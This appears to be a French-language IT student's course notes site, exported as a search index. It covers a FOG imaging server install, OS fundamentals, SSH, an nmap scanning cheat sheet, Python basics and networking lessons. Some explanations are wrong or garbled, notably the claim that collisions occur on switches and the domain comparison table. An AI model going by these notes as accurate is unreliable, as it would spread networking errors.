some implications within FOG, PXE and fog-client and you want\n  to read https://wiki.fogproject.org/HTTPS before you decide!\n  Would you like to enable secure HTTPS on your FOG server? [y/N] N\n  \n  # Choisir le Nom de votre Machine\n  Which hostname would you like to use? Currently is: fogsrv\n  Note: This hostname will be in the certificate we generate for your\n  FOG webserver. The hostname will only be used for this but won't be\n  set as a local hostname on your server!\n  Would you like to change it? If you are not sure, select No. [y/N] N\n  \n  FOG would like to collect some data:\n      We would like to collect the following information:\n        1. OS Name (CentOS, RedHat, Debian, etc....)\n        2. OS Version (8.0.2004, 7.2.1409, 9, etc....)\n        3. FOG Version (1.5.9, 1.6, etc....)\n\n  What is this information used for?\n      We would like to simply track the common types of OS\n      being used, along with the OS Version, and the various\n      versions of FOG being used.\n\n  Are you ok with sending this information? [Y/n] n\n\n   ######################################################################\n   #     FOG now has everything it needs for this setup, but please     #\n   #   understand that this script will overwrite any setting you may   #\n   #   have setup for services like DHCP, apache, pxe, tftp, and NFS.   #\n   ######################################################################\n   # It is not recommended that you install this on a production system #\n   #        as this script modifies many of your system settings.       #\n   ######################################################################\n   #             This script should be run by the root user.            #\n   #      It will prepend the running with sudo if root is not set      #\n   ######################################################################\n   #            Please see our wiki for more information at:            #\n   ######################################################################\n   #             https://wiki.fogproject.org/wiki/index.php             #\n   ######################################################################\n\n # Voici un r\u00e9capitulatif des choix effectu\u00e9s  \n\n * Here are the settings FOG will use:\n * Base Linux: Redhat\n * Detected Linux Distribution: Rocky Linux\n * Interface: ens160\n * Server IP Address: 192.168.10.42\n * Server Subnet Mask: 255.255.255.0\n * Hostname: fogsrv\n * Installation Type: Normal Server\n * Internationalization: Yes\n * Image Storage Location: /images\n * Using FOG DHCP: No\n * DHCP will NOT be setup but you must setup your\n | current DHCP server to use FOG for PXE services.\n\n * On a Linux DHCP server you must set: next-server and filename\n\n * On a Windows DHCP server you must set options 066 and 067\n\n * Option 066/next-server is the IP of the FOG Server: (e.g. 192.168.10.42)\n * Option 067/filename is the bootfile: (e.g. undionly.kkpxe or snponly.efi)\n * Send OS Name, OS Version, and FOG Version: No\n\n * Are you sure you wish to continue (Y/N) Y\n</code></pre> Je vous passe les installations de paquets, apr\u00e8s un certain temps vous devriez avoir ce message signifiant que l'installation c'est bien pass\u00e9.  </p> <p>Installation base de donn\u00e9e<pre><code> * You still need to install/update your database schema.\n * This can be done by opening a web browser and going to:\n\n   http://192.168.10.43/fog/management\n\n * Press [Enter] key when database is updated/installed.\n</code></pre> Il faudra ce rendre sur l'URL indiqu\u00e9 et d'initialiser la base de donn\u00e9e afin de finaliser l'installation de celle-ci  </p> <p></p> <p></p> <p>Sur le terminal la validation de la base de donn\u00e9e en interface web se traduira par cette affichage Celui-ci stipule les informations de connexion par d\u00e9faut Finalisation d'installation<pre><code> * Setup complete\n\n   You can now login to the FOG Management Portal using\n   the information listed below.  The login information\n   is only if this is the first install.\n\n   This can be done by opening a web browser and going to:\n\n   http://192.168.10.43/fog/management\n\n   Default User Information\n   Username: fog\n   Password: password\n\n * Changed configurations:\n\n   The FOG installer changed configuration files and created the\n   following backup files from your original files:\n   * /etc/vsftpd/vsftpd.conf &lt;=&gt; /etc/vsftpd/vsftpd.conf.1698936954\n   * /etc/exports &lt;=&gt; /etc/exports.1698936954\n</code></pre></p>"},{"location":"Linux/FogProject/fogproject/#interface-graphique","title":"Interface Graphique","text":""},{"location":"Linux/FogProject/fogproject/#page-de-connexion","title":"Page de connexion","text":""},{"location":"Linux/FogProject/fogproject/#dashboard","title":"Dashboard","text":""},{"location":"Linux/FogProject/fogproject/#premieres-modification","title":"Premieres modification","text":""},{"location":"Linux/FogProject/fogproject/#passage-en-francais-de-linterface-graphique","title":"Passage en Fran\u00e7ais de l'interface graphique","text":"<p>Pour cela il faut ce rendre dans le menu de configuration  </p> <p></p> <p>Selection de \"FOG Settings\"  </p> <p></p> <p>Descendre jusqu'a l'onglet \"General Settings\" puis changer le \"Default Locale\" de \"English-&gt;Fran\u00e7ais\"  </p> <p></p>"},{"location":"Linux/FogProject/fogproject/#modification-des-identifiants-de-connexion-par-defaut","title":"Modification des Identifiants de connexion par d\u00e9faut","text":"<p>Une fois sur l'interface \"Utilisateurs\" selectionn\u00e9 \"Fog\" puis choisir un nom \"admin\" dans mon cas  </p> <p></p> <p>Ensuite pour des raisons de s\u00e9curit\u00e9 il faudra changer le mdp par d\u00e9faut  </p> <p></p>"},{"location":"Linux/FogProject/fogproject/#capture-dune-image-windows-10-egalement-applicable-sur-windows-11","title":"Capture d'une image Windows 10 (\u00e9galement applicable sur Windows 11 ?)","text":""},{"location":"Os/OS/","title":"Comment d\u00e9finir un syst\u00e8me d'exploitation ?","text":"<p>Un systeme d'exploitation ou (Operating System = OS) en anglais un logiciel qui est \u00e9dit\u00e9 et propos\u00e9 par :</p> <ul> <li>Des communaut\u00e9 (Linux...)</li> <li>Des groupes priv\u00e9s (MicroSoft, Apple...)</li> <li>Des fabricant de mat\u00e9riel (Synology,Qnap, Samsung...)</li> </ul> <p>Il pilote (donne des ordres) les dispositif mat\u00e9riel. Les ordres sont donn\u00e9es par l'utilisateur, ainsi que par des application mise a la disposition de l'utilisateur. Sans utilisateur le systeme d'exploitation ne peut pas faire grand chose. Le r\u00e9sultat du travail effectu\u00e9 par le mat\u00e9riel est rendu par d\u00e9faut \u00e0 l'ecran ou bien vers d'autre peripheriques (ex: une imprimante).</p>"},{"location":"Os/OS/#quelles-sont-ses-fonctions-principales","title":"Quelles sont ses fonctions principales ?","text":"<p>Le systeme d'exploitation g\u00e8re :</p> <ul> <li>Le Processeur: C'est l'OS qui lui envoi des ordres, ordre donn\u00e9 par l'utilisateur ou par l'intermediaire d'un logiciel,</li> <li>La M\u00e9moire Vive: il va chercher les resultats des calculs (en RAM) effectu\u00e9 par le processeur pour les retranscrire \u00e0 l'utilisateur,</li> <li>Les Applications: Il en optimise l'\u00e9x\u00e9cution en leurs attribuant les ressources n\u00e9cessaire et il partage l'ensemble des ressources mat\u00e9riel aux applications ouverte simultan\u00e9ment.</li> <li>Monitoring: Il fournit des informations sur le bon fonctionnement de la machine via:</li> <li>Des tableaux de bord affichant les informations en temps reel</li> <li>Des journaux (log) archiv\u00e9 sur plusieurs semaine</li> <li>S'assure de l'utilisation des periph\u00e9riques dans les meilleurs conditions</li> <li>S'assure d'une bonne communication entre la carte m\u00e8re et les p\u00e9riph\u00e9riques via les bus</li> <li>S'assure du bon fonctionnement via les pilotes (Drivers)</li> <li>Drivers = manuels d'utilisation des p\u00e9riph\u00e9riques pour l'OS</li> <li>Proteger l'acces aux ressources:</li> <li>Il priorise les acc\u00e8s lorsqu'un conflit d'acc\u00e8s apparait</li> <li>Protege l'acces aux ressources: chaque OS s'appuie sur un principe de privilege d'acces (Les actions et acc\u00e8s d'un simple utilisateur seront r\u00e9duite compar\u00e9 aux acc\u00e8s d'un administrateur de la machine. l'OS veillera \u00e0 permettre l'acc\u00e8s \u00e0 des informations et/ou ressources au seul personne concern\u00e9s |une personne non autoris\u00e9e \u00e0 consulter une donn\u00e9es aura une notification syst\u00e8me|) [image du cours sch\u00e9ma OS]</li> </ul>"},{"location":"Os/OS/#de-quoi-est-il-compose","title":"De quoi est-il compos\u00e9 ?","text":"<ul> <li>Un noyau (ou kernel): L'element de l'OS en lien direct avec le mat\u00e9riel, ce noyau peut evoluer, etre mis a jour, des modules compl\u00e9mentaires peuvent venir si greffer.</li> <li>CLI (Command Line Interface) ou Shell: Interpr\u00e9teur de commande jouant le r\u00f4le d'interm\u00e9diaire entre l'utilisateur et l'OS. En fonction du Systeme d'Exploitation les shell peuvent differer</li> <li>GUI (Graphical User Interface): Permet une interaction plus naturel, plus friendly, pour les utilisateurs non initi\u00e9s au Shell. A noter que sur certain OS les GUI sont facultatives.</li> </ul> <p>Certain Systeme propose nativement leurs interface graphique (historiquement MicroSoft). D'autre OS laissent le choix \u00e0 l'utilisateur d'en utiliser ou non.</p> <ul> <li>Systeme de fichiers: il permet le bon fonctionnement de l'OS via les indispensables fichiers systemes mais il permet \u00e9galement aux utilisateurs de conserver leurs donn\u00e9es dans le temps afin de pouvoir les reutiliser.</li> <li>Ils organisent les donn\u00e9es et eventuellement securise l'acc\u00e8s aux donn\u00e9es au seins d'un espace de stockage (ex: Disque Dur, Cles USB)</li> </ul>"},{"location":"Os/OS/#ou-peut-on-les-trouver","title":"Ou peut-on les trouver ?","text":"<p>Plus la technologie \u00e9volue, plus nous utilisons d'outils connect\u00e9 pilot\u00e9 via des systemes d'exploitation ils sont  donc trouvables partout autour de nous. On pense en priorit\u00e9 \u00e0 :</p> <ul> <li>Nos ordinateur personnel,</li> <li>Au travail via les serveur de notre entreprise et nos poste client</li> <li>Nos t\u00e9l\u00e9phone portable/tablette (Android/IOS)</li> <li>Les montres connect\u00e9 (Androidwear ou watchOS)</li> <li>Du mat\u00e9riel reseau comme par exemple dans les switch &amp; les routeurs (Ios cisco/ HP com wear),</li> <li>Les televisions avec AndroidTV etc,</li> <li>Des voitures (ordinateur de bord etc).</li> </ul>"},{"location":"Os/OS/#systeme-dexploitation-linux","title":"Systeme d'exploitation Linux","text":"<p>Un systeme d'exploitation est un composant logiciel principal, qui permet d'exploiter un ordinateur, c'est lui qui permet l'utilisation d'un clavier, d'une souris, d'avoir un retour des actions a l'ecran etc c'est un programme (ou ensemble de programmes) charg\u00e9 de gerer les ressources mat\u00e9rielles d'un ordinateur et de les mettre \u00e0 disposition des utilisateurs.</p> <p>Exemples de syst\u00e8mes d'exploitation:</p> <ul> <li>Systemes Propri\u00e9taire (int\u00e9gralement li\u00e9 a un fabricant)</li> <li>AS400 (IBM)</li> <li>Syst\u00e8mes ouvert mono poste, mono t\u00e2che (micro)</li> <li>DOS sous license propri\u00e9taire mais permet une plus grande plage d'installation et d'utilisation</li> <li>Syst\u00e8me ouvert multi-poste, multi-tache, multi-plateforme</li> <li>UNIX, GNU/Linux, Windows, OS-X</li> </ul>"},{"location":"Os/OS/#composantes-dun-systeme-dexploitation","title":"Composantes d'un syst\u00e8me d'exploitation","text":"<p>Sch\u00e9ma en couche</p> <ol> <li>Mat\u00e9riel avec lequel le systeme d'exploitation echangera carte mere, processeur, memoire vive et disque dur mais \u00e9galement \u00e9cran, clavier, souris, carte graphique, carte son et autres p\u00e9riph\u00e9rique externe</li> <li>Noyau charg\u00e9 des \u00e9changes avec le mat\u00e9riel et les couches logiciel sup\u00e9rieur, il est le coeur du systeme d'exploitation</li> <li>Shell l'interface principale par laquelle l'utilisateur pourra utiliser des ressources de l'ordinateur et les logiciels et application disponible. Dans le monde Windons c'est la GUI mais parfois une console type CMD ou PowerShell. Dans le monde linux c'est principalement la ligne de commande, le shell nomm\u00e9e Bash.</li> <li>Application(s) toutes les applications disponible \u00e0 l'utilisateur, un editeur de texte comme word ou <code>vi</code>sous linux, d'un browser comme firefox google chrome etc</li> <li>Utilisateur(s) Si les app sont souvent la finalit\u00e9 de l'utilisateur il int\u00e9ragit d'abord avec le shell pour lancer le programme et avoir acces a ses dossiers, ses fichiers.  </li> </ol> <p>Le noyau UNIX/Linux est le programme principal du syst\u00e8me.  </p> <ul> <li>Il a pour role de :</li> <li>G\u00e9rer les ressources (p\u00e9riph\u00e9riques,m\u00e9moire...)</li> <li>Ordonnancer les diff\u00e9rentes t\u00e2ches (processus) cadenser les diverses taches pour quelle puisse s'executer en meme temps sans qu'une seule ne vienne s'accaparer l'int\u00e9gralit\u00e9 des ressources disponibles</li> <li>Mettre ces ressources \u00e0 la disposition des utilisateurs</li> <li>Dans un sens plus large, on entend souvent par noyau linux, le noyau lui-m\u00eame ainsi que l'ensemble essentiels au syst\u00e8me.</li> <li>On utilise \u00e9galement le mot anglais Kernel.</li> </ul>"},{"location":"Os/OS/#connexion-a-un-systeme-linux","title":"Connexion \u00e0 un systeme Linux","text":"<p>Pour la connexion un utilisateur doit disposer un compte</p> <ul> <li>identifiant</li> <li>mot de passe</li> </ul> <p>le mdp ne sera pas afficher pour des mesures de s\u00e9curit\u00e9</p>"},{"location":"Os/OS/#connexion-direct","title":"connexion direct","text":"<p>plusieurs maniere sont possible de ce connecter:</p> <ul> <li>directement sur un SRV ou une VM, via la console m\u00e9thode disponible pour la 1ere installation du syst\u00e8me ou en cas de panne (\u00e9galement appel\u00e9 la boite noire).</li> <li>via une interface graphique</li> </ul>"},{"location":"Os/OS/#connexion-distante","title":"Connexion distante","text":"<p>Connexion distante en ssh a travers:</p> <ul> <li>une fenetre <code>cmd.exe</code> (windows r\u00e9cent)</li> </ul> <pre><code>C:\\Users\\Math&gt;ssh user12@10.106.200.126\nuser12@10.106.200.126's password:\nLinux srv-formateur 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Mon Jul  3 16:52:37 2023 from 172.25.128.2\nuser12@srv-formateur:~$\n</code></pre> <ul> <li>un logiciel d\u00e9di\u00e9 (par exemple Putty) Putty est le plus connu des logiciels de connexion ssh il est Open Source il permet la copie de fichiers pscp &amp; psftp</li> </ul> <p>il y a bien d'autre logiciel de connexion a distance depuis windows:</p> <ul> <li>Kitty: \"Fork\" de Putty.  </li> </ul> Fork <p>Nouceau logiciel bas\u00e9 sur les sources d'un pr\u00e9c\u00e9dent. Souvent suite a des divergences de developpeur ou apres le rachat d'une entreprise.</p> <ul> <li> <p>mRemoteNG: Solution reutilisant putty pour l'inclure dans une interface plus ergo et permet l'utilisation de conneion RDP pour ce connecter sur des serveur windows. Soft multi-protocole (linux, windows, citrix, VNC...)</p> </li> <li> <p>MobaXtrem : logiciel propri\u00e9taire proche de mRemoteNG mais payant pour les entreprises</p> </li> </ul>"},{"location":"Os/OS/#deconnexion-dune-session-distante","title":"Deconnexion d'une session distante","text":"<p>Dernieres etapes importante! Plusieurs m\u00e9thodes sont possibles et variables selon le shell utilis\u00e9.</p> <ul> <li>exit : Commande la plus utilis\u00e9e. Compatible avec la quasi-totalit\u00e9 des shells, \u00e0 commencer par bash  </li> <li>logout\u00f9 : autre commande disponible pour bash (mais pas bourne)</li> <li>^D : [ctrl]+D, raccourci clavier permettant de fermer une session.</li> </ul> <p>/// note | CTRL La syntaxe <code>^</code> est associ\u00e9 a la touche [ctrl] exemple sur Windows un raccourci copi\u00e9 [ctrl+C] sera affcih\u00e9 [^+C] ///</p>"},{"location":"Outils/Nmap/nmap/","title":"NMAP","text":"<p>NMAP (Network MAPper) est un logiciel open-source utilis\u00e9 pour la d\u00e9couverte des r\u00e9seaux informatiques. Il est fr\u00e9quemment utilis\u00e9 pour :  </p> <ul> <li>La d\u00e9couverte d'h\u00f4tes actif sur un r\u00e9seau (visible ou cach\u00e9s, il d\u00e9tecte \u00e9galement les syst\u00e8mes derri\u00e8re un pare-feu).  </li> <li>Analyse des ports ouverts sur un h\u00f4te, permettant de d\u00e9terminer les services en cours d'\u00e9x\u00e9cution et d'identifier les \u00e9ventuelles vuln\u00e9rabilit\u00e9s.  </li> <li>D\u00e9tection d'OS en fonction dont l'h\u00f4te r\u00e9pond aux requ\u00eates r\u00e9seau.  </li> <li>Scripting via des scripts personnalis\u00e9s pouvant \u00eatre utilis\u00e9s pour effectuer :  <ul> <li>Des tests de s\u00e9curit\u00e9  </li> <li>Collecte d'informations sp\u00e9cifiques  </li> <li>Automatiser des t\u00e2ches de d\u00e9couverte et d'audit.  </li> </ul> </li> <li>Prend en charge de la CLI et de la GUI.  </li> </ul> <p>lien vers le site NMAP</p>"},{"location":"Outils/Nmap/nmap/#scan-de-reseau","title":"Scan de r\u00e9seau","text":"<p>Exemple d'utilisation  </p> <pre><code>nmap [Type de Scans] [Options] {Host cible} \n\nnmap -sP 192.168.1.1/24         # d\u00e9couverte de tout les hosts sur le r\u00e9seau 'scan et ping )\nnmap 192.168.10,.0-255          # scan plage d'adresses  \n     192.168.10.*\n     192.168.10.0/24\nnmap -iL /host.txt              # scan de host dans un fichier \n</code></pre>"},{"location":"Outils/Nmap/nmap/#options","title":"Options","text":"<pre><code>-v ou -vv                   # mode bavard\n--exclude 192.168.1.5       # exclure un host \n-sL 192.168.1.1/30          # liste simplement les ip du masque \n-PN 192.168.1.1/24          # pas de scan ping \n-PS 192.168.1.1/24          # ping tcp syn \n-PA                         # ping tcp ack \n-PU                         # ping udp \n-PE; -PP; -PM               # ping icmp \n-PR                         # ping arp \n--exclude 192.168.1.1       # exclure ip \n-n                          # pas de dns \n-R                          # dns \n\u2013open                       # Afficher que les ports ouverts\n-oN                         # Enregistrer le r\u00e9sultat du scan dans un fichier au formate texte\n-oX                         # Enregistrer le r\u00e9sultat du scan dans un fichier au formate XML\n-p                          # Sp\u00e9cifier les ports r\u00e9seaux \u00e0 scanner\n-Pn                         # D\u00e9sactiver la d\u00e9couverte d\u2019h\u00f4te\n-r                          # Analyser les ports cons\u00e9cutivement\n-sT                         # Faire un scan de port TCP\n-sU                         # Faire un scan de port UDP\n-sV                         # Trouver les versions du service\n-script                     # Utilise un script interne \u00e0 nmap pour scan de vuln\u00e9rabilit\u00e9, bruteforce, etc\n</code></pre>"},{"location":"Outils/Putty/putty/","title":"PuTTY","text":"<p>lien vers le site PuTTY</p>"},{"location":"Procedures/installation_glpi/","title":"Installation glpi","text":"<p>dsvxc</p>"},{"location":"Python3/python/","title":"Python","text":"<ul> <li><code>var</code> = entier,decimal,caract\u00e8re (int,float,string)</li> <li><code>\\n</code> saut\u00e9 une ligne dans string ou print</li> <li><code>liste</code> = ['salut' , '\u00e7a' , 'va']</li> <li>print(liste[0:3]) print(*liste)</li> </ul> Op\u00e9rateur Nom + Op\u00e9rateur Nom + Addition \u2013 Soustraction * Multiplication / Division % Modulo ** Puissance // Division enti\u00e8re x = 3 print:3 -= x -=3 print:0 /= x /=3 print:1 *= x *= 3 print:12 += x += 3 print:6 := != true ou false == true ou false &lt;&gt; true ou false &lt;= &gt;= true false <p><pre><code>print(num:=int(input()))  # creer une variable  \nraw_input('tapez ip: ')  # valeur entr\u00e9 au clavier \ninput() # idem au dessus mais pour python3\n\nint() deviens une valeur entier example int(raw_input('3'))\n</code></pre> <pre><code>print(\"\"\"texte\nsur\nplusieurs\nlignes\"\"\")\n</code></pre></p> <pre><code>&gt;&gt;&gt; x = 3\n&gt;&gt;&gt; print \"x vaut : \" + str(x) \nx vaut : 3\n# x etant un entier il ne peu pas s'additionner a une chaine de caract\u00e8re \n\n&gt;&gt;&gt; x = 3.125\n&gt;&gt;&gt; print \"x vaut : \" + str(float(x))\nx vaut : 3.125\n&gt;&gt;&gt; print \" x vaut : \" + str(int(x))\nx vaut : 3\n</code></pre>"},{"location":"Python3/python/#fonction","title":"fonction","text":"<pre><code>input()     # entr\u00e9e au clavier \n\nprint()     # afficher \n\nint('')     # nombre entier : 3\n\nfloat('')   # nombre decimal : 3.254\n\nstr('')     # chaine de caract\u00e8re \n\n.upper()    # majuscule x = text.upper()\n\n.lower()    # minuscule x = text.lower()\n\n.capitalize() # majuscule premi\u00e8re lettre \n\nlen()       # compte len(\"salut\") retourne 5\n\n.pop()      # supprime un \u00e9l\u00e9ment de liste \n                liste.pop(1)\n.append()   # ajoute a la fin d'une liste \n\n.insert(2,'') # ajoute a la place donn\u00e9  \n\ndef fonct():  # cr\u00e9e sa fonction\n    return\n</code></pre>"},{"location":"Python3/python/#if","title":"if","text":"<pre><code>if 10 &gt; 5:          # attention aux deux points \n    print(\"10 greater than 5\")\n\nprint(\"Program ended\")\n</code></pre>"},{"location":"Python3/python/#else","title":"else","text":"<pre><code>x = 4\nif x == 5:\n    print(\"Yes\")\nelse:\n    print(\"No\")\n</code></pre>"},{"location":"Python3/python/#elif","title":"elif","text":"<pre><code>num = 3\nif num == 1:\n    print(\"One\")\nelif num == 2:\n    print(\"Two\")\nelif num == 3: \n    print(\"Three\")\nelse: \n    print(\"Something else\")\n</code></pre>"},{"location":"Python3/python/#and-et-or","title":"and et or","text":"<pre><code>temperature = 35\n\nif temperature &gt; 18 and temperature &lt; 22:       # temp supp a 18 et inf a 22\n    print('il fais bon')\n\nif temperature &gt; 18 or temperature == 22:       # temp supp a 18 ou \u00e9gal (boll\u00e9en)\n    print('test')\n</code></pre>"},{"location":"Python3/python/#not","title":"not","text":"<pre><code>print(not 1 == 1)\nfalse\nprint(not 1 &gt; 7)\ntrue\n</code></pre>"},{"location":"Python3/python/#boucle","title":"Boucle","text":""},{"location":"Python3/python/#for-in","title":"for in","text":"<pre><code>for _ in range(): # nombre ou variable\na = 1\nb = 1\nfor loop in range(20):\n    for loop in range(20):\n        print(a * b, end=' ')\n        b = b + 1\n    a = a+ 1\n    b = 1\n    print()\n</code></pre>"},{"location":"Python3/python/#while","title":"while","text":"<pre><code>a=1\nwhile a &lt; 10:\n    print(a)\n    a = a + 1\n</code></pre>"},{"location":"Reseaux/Domaine_diffusion_collision/","title":"Domaine de Diffusion et de Collision","text":""},{"location":"Reseaux/Domaine_diffusion_collision/#definition-dun-domaine","title":"D\u00e9finition d'un domaine","text":"<p>Un domaine est une r\u00e9gion d'un r\u00e9seau ou tous les ordinateurs utilisateurs, les imprimantes et autres p\u00e9riph\u00e9riquess sont enregistr\u00e9s. Il s'agit d'une base de donn\u00e9es centrale sur un ou plusieurs clusters (grappe) d'ordinateurs centraux, appel\u00e9e contr\u00f4leurs de domaine.</p>"},{"location":"Reseaux/Domaine_diffusion_collision/#domaine-de-diffusion","title":"Domaine de Diffusion","text":"Il y a 4 domaines de diffusion <p>Un domaine de diffusion contient tous les p\u00e9riph\u00e9riques qui peuvent ce joindre au niveau de la couche 2 du mod\u00e8le OSI. Tous les ports d'un switch sont, par d\u00e9faut, dans le m\u00eame domaine de diffusion. Tous les ports d'un routeur se trouvent dans des domaines diff\u00e9rents, et les routeurs ne transf\u00e8rent pas les d'un domaine de diffusion \u00e0 un autre.  </p> <p>En r\u00e9sum\u00e9</p> <ul> <li>un switch gardent les domaines de diffusion</li> <li>un routeur divisent les domaines de diffusion</li> </ul>"},{"location":"Reseaux/Domaine_diffusion_collision/#les-differents-mode-de-diffusion","title":"Les diff\u00e9rents mode de diffusion","text":""},{"location":"Reseaux/Domaine_diffusion_collision/#diffusion-unicast","title":"Diffusion Unicast","text":"<p>Une communication Point \u00e0 Point. Un message est envoy\u00e9 d'un \u00e9metteur \u00e0 un destinataire sp\u00e9cifique.</p>"},{"location":"Reseaux/Domaine_diffusion_collision/#diffusion-broadcast","title":"Diffusion Broadcast","text":"<p>Dans ce mode de diffusion, un message est envoy\u00e9 \u00e0 tous les noeuds (ou p\u00e9riph\u00e9riques) du r\u00e9seau. Cela signifie que tous les appareils connect\u00e9s au r\u00e9seau peuvent recevoir le message.</p>"},{"location":"Reseaux/Domaine_diffusion_collision/#diffusion-multicast","title":"Diffusion Multicast","text":"<p>C'est une combinaison de la diffusion unicast et de la diffusion broadcast. Dans ce mode, un message est envoy\u00e9 \u00e0 groupe sp\u00e9cifique de destinataires qui se trouvent dans la m\u00eame cat\u00e9gorie ou ont int\u00e9r\u00eats communs. Seuls les membres du groupe recevront le message. Typiquement un r\u00e9seau vid\u00e9o il y aura un \u00e9metteur (la cam\u00e9ra) et plusieurs r\u00e9cepteurs.  </p>"},{"location":"Reseaux/Domaine_diffusion_collision/#diffusion-anycast","title":"Diffusion anycast","text":"<p>Dans ce mode, un message est envoy\u00e9 \u00e0 l'un des noeuds d'un groupe de noeuds qui sont tous d\u00e9sign\u00e9s par la m\u00eame adresse. Le message est re\u00e7u par le noeud le plus proche (ou le plus appropri\u00e9) parmi les membres du groupe.  </p>"},{"location":"Reseaux/Domaine_diffusion_collision/#domaine-de-collision","title":"Domaine de Collision","text":"<p>A la diff\u00e9rence d'un domaine de diffusion, un domaine de collision est la partie du r\u00e9seau o\u00f9 des collisions de paquets peut se produire. Une collision se produit lorsque 2 p\u00e9riph\u00e9riques envoient un paquet en m\u00eame temps sur le m\u00eame segment de r\u00e9seau partag\u00e9. Les paquets entrent en collision et les 2 appareils doivent renvoyer les paquets, ce qui impact l'efficacit\u00e9 du r\u00e9seau. Les collisions se produisent souvent sur les switchs, car chaque port est dans le m\u00eame domaine.  </p> <p> A noter</p> <p>Chaque port d'un concentrateur est dans le m\u00eame domaine de collision. Chaque port d'un routeur, switch, passerelle est dans un domaine de collision s\u00e9par\u00e9.</p> <p></p> Il y a 7 domaines de collision"},{"location":"Reseaux/Domaine_diffusion_collision/#difference-entre-domaine-de-collision-et-de-diffusion","title":"Diff\u00e9rence entre domaine de collision et de diffusion","text":"Domaine de collision Domaine de diffusion Le domaine de Collision est une section dequi permet au trafic de circuler enavant et en arri\u00e8re Un domaine de diffusion est un type dedomaine dans lequel le trafic circule surtout le r\u00e9seau Le domaine Collision fait r\u00e9f\u00e9rence \u00e0 unensemble de p\u00e9riph\u00e9riques dans lesquelsune collision de paquets peut se produire. Le domaine de Diffusion fait r\u00e9f\u00e9rence \u00e0 unensemble logique de syst\u00e8mes informatiquesaccessibles sans utiliser de routeur. Les p\u00e9riph\u00e9riques peuvent inclure lesp\u00e9riph\u00e9riques d'autres sous-r\u00e9seaux IP. Le domaine de Diffusion n'est jamais limit\u00e9au sous-r\u00e9seau IP sp\u00e9cifique pour tous lestypes de diffusion IP. Une colission de paquets se produit lorsqueplusieurs p\u00e9riph\u00e9riques transmettent desdonn\u00e9es sur une seule liaison filaire. Le domaine de Diffusion utiliseprincipalement un environnementcommut\u00e9 pour diffuser, donc aucunecollision ne se produit. Les Switchs se planterontdans le domaine de diffusion Les Switchs ne seront jamaisinterrompus dans le domaine de diffusion. Dans le domaine de collision, chaque portd'un routeur se trouve dans les domainesde diffusion distincts. Tous les ports d'un switch sont suceptibled'\u00eatre dans le m\u00eame domaine de diffusion."},{"location":"Reseaux/correction%20TP4/","title":"correction TP4","text":"<p>TCP souhaite un acquittement de paquet (controle d'erreur) UDP n'as pas besoin de retour</p> <p>A-&gt;B impossible le poste B ne peut communiquer car pas sur le meme reseau que la passerelle. A-&gt;C Possible car le s-rx le permet (/8) A-&gt;D Possible via la passerelle A-&gt;E impossible car E (/16) alors que le routeur est en (/24) donc pas de connaissance du sur-rsx E</p> <p>B-&gt; ne peut communiquer avec aucun des postes (pas la bonne IP)</p> <p>C-&gt;A  C-&gt;B C-&gt;D Possible via la Passerelle C-&gt;E impossible meme raison que (A-&gt;E)</p> <p>Bien verifier les masques et les passerelles.</p> <p>!!!! Masque de F empeche la communication vers -&gt;D &amp; -&gt;E comme le masque F est /8 il ne peut atteindre le reseau 172.20 en /16 car pour lui il s'agit du meme reseau en 172.X.X.X donc aucun interet pour lui de sortir via la passerelle. vulgairement il tente de joindre un \u00e9quipement qui pour lui est dans son r\u00e9seau mais non branch\u00e9</p> <p>fournir les sauts afin d'atteindre les Routeurs avec le moins de saut possible</p> <p>R1: 13.107.32.0/19 R2     13.107.64.0/18 permet d'atteindre le rx .64 .96     13.107.128.0/17 permet d'atteindre le rx .128 .160 .192 .224</p>"},{"location":"Reseaux/correction%20TP4/#table-de-routage","title":"Table de routage","text":"<p>un routeur ne vois que son voisin ! dans notre cas le r\u00e9seau est lin\u00e9aire !</p> <p>--R1--R2--R3--R4-- R=Routeur</p> <p>R1 ne verra que R2 R2 ne verra que R1 &amp; R3 R3 ne verra que R2 &amp; R4 R4 ne verra qur R3</p> <p></p> <p>R\u00e9sum\u00e9 de route! pour agreger un rs convertir les adresses en binaire et prendre le masque englobant</p>"},{"location":"Reseaux/Module-Couche_OSI/","title":"Le Mod\u00e8le OSI","text":"<p>Le mod\u00e8le OSI (Open System Interconnection) est compos\u00e9 de\u00a0:</p> <ul> <li>7 <code>couches</code>ind\u00e9pendantes et communicantes (couches adjacentes)</li> <li>Une <code>couche</code>est un ensemble de service pr\u00e9cis</li> <li>repr\u00e9sente la communication entre syst\u00e8mes d\u2019information en r\u00e9seau</li> </ul> <p>Le mod\u00e8le OSI explique de fa\u00e7on d\u00e9taill\u00e9e la communication entre 2 \u00e9quipements</p> <p>Moyen mn\u00e9motechnique pour ce souvenir des <code>couches</code> Pour Le R\u00e9seau, Tout Se Passe Automatiquement (\u00e0 lire de la <code>couche</code>1 \u00e0 7)</p> <p></p>"},{"location":"Reseaux/Module-Couche_OSI/#couche-par-couche","title":"Couche par Couche","text":""},{"location":"Reseaux/Module-Couche_OSI/#7-application-couche-applicative","title":"7- APPLICATION (couche applicative)","text":"<p>Couche Application Point de contact avec les services r\u00e9seau.</p> <ul> <li>Communication entre applications,</li> <li>Communication entre l\u2019utilisateur et les applications (interface IHM),</li> <li>Entr\u00e9e et Sortie des donn\u00e9es.  </li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/#6-presentation","title":"6- Pr\u00e9sentation","text":"<p>Couche Pr\u00e9sentation Elle s\u2019occupe de tout aspect li\u00e9 \u00e0 la pr\u00e9sentation/traduction des donn\u00e9es\u00a0:</p> <ul> <li>formatage des donn\u00e9es,</li> <li>(D\u00e9) chiffrement,</li> <li>(D\u00e9) compression,</li> <li>encodage\u2026</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/#5-session","title":"5- Session","text":"<p>Couche Session Responsable de l\u2019initialisation de la session, de sa gestion et de sa fermeture.</p> <ul> <li>Authentification entre les PC,</li> <li>Synchronisation des \u00e9changes,</li> <li>Cr\u00e9ation de points de contr\u00f4le</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/#4-transport","title":"4- Transport","text":"<p>Couche Transport Choix du protocole de transmission et pr\u00e9paration de l\u2019envoi des donn\u00e9es. Elle sp\u00e9cifie le port utilis\u00e9 par l\u2019application 